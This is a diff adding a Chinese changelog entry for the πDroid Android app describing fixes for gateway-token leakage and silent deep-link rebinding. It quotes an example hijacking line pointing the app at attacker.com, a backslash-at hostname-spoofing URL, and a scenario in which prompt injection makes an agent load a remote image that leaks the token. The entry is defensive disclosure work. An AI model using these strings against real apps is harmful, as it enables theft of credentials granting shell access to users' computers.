@@ -2,6 +2,20 @@
 
 All notable changes to the πDroid application will be documented in this file.
 
+## [2.0.8] - 2026-11-05
+
+### 🔒 网关 Token 收口：只对网关自己附带，外部链接换绑必须用户确认
+
+三处都会把「伴侣 PC 的全权凭据」交到不该给的地方。网关 Token 等价于本机命令行权限（能执行 shell、读写任意文件），所以按 SSH 私钥对待。
+
+- **技能市场直连泄 Token**：`AuthInterceptor` 挂在主 `OkHttpClient` 上却没有 host 约束，技能搜索的兜底直连 `https://skills.sh/api/search` 会连 `Authorization: Bearer <网关Token>` 一起发出去；对方的 401 还会被当成「网关收回了密钥」，反过来弹窗逼用户重新扫码。新增 `AuthScope.shouldAttachToken()`（`scheme + host + port` 全等才附带），拦截器与媒体加载器共用同一判定；外站响应不再参与 `AuthRejection` 判定。
+- **外链图片被动泄 Token**：Markdown 里的 `![](https://图床/x.png)` 会原样进入媒体加载器，且**图片进视口就自动请求**（不需要用户点击）。旧实现无条件附加 Token，等于任何一个图床都能接管伴侣电脑——尤其是一条 prompt injection 让 agent 读个带远程图片的 README 就够了。现在 `fetchBytes` 必须显式传入网关地址，host 不符一律裸取。
+- **`pidroid://connect` 静默换绑**：该 scheme 是 `BROWSABLE` 的，任何网页一句 `location.href = "pidroid://connect?url=https://attacker.com&token=x"` 就能唤起 App；旧实现 ping 通即 `saveConnection`，全程不问用户一句，之后所有指令都发往攻击者服务器。现在只挂起请求，经 `ConnectLinkConfirmDialog` 展示完整 host、用户手动确认后才走与扫码/手动配置相同的 `connectToServer`（ping 成功才落盘）。App 内扫码走的是另一条路，正常配对流程不受影响。
+- **顺带修掉 URL 前后空格**：`serverUrl` 读写都补 `trim()`。此前只做 `trimEnd('/')`，扫码/粘贴带进来的前导空格会让 OkHttp 抛 `Unexpected char`，用户看到的却是一句莫名其妙的「获取会话失败」。
+- **判定不误伤内网图**：判定只解析 `scheme://authority`，路径里的空格、`|`、中文一律不参与——否则工作区中文路径的图片会被判成「外站」而不带 Token，变成 403 回归。同时把反斜杠按 OkHttp 规则归一化，防住 `http://evil.com\@gw/x` 这类用 `@` 伪装主机名的写法。
+- **单测**：新增纯 JVM `AuthScopeTest`（13 例 / 39 断言），覆盖外站、外链图床、userinfo 与反斜杠伪装、IPv6、下划线主机名（不同端口不得归一）、默认端口省略、非 http(s)、空白与畸形输入。威胁模型与防护记录同步进 `docs/SECURITY_UPGRADES.md`。
+
+
 ## [2.0.7] - 2026-11-04
 
 ### 🧹 会话卡片底部元信息行改版：时钟贴最左，清掉被压扁的省略号噪点
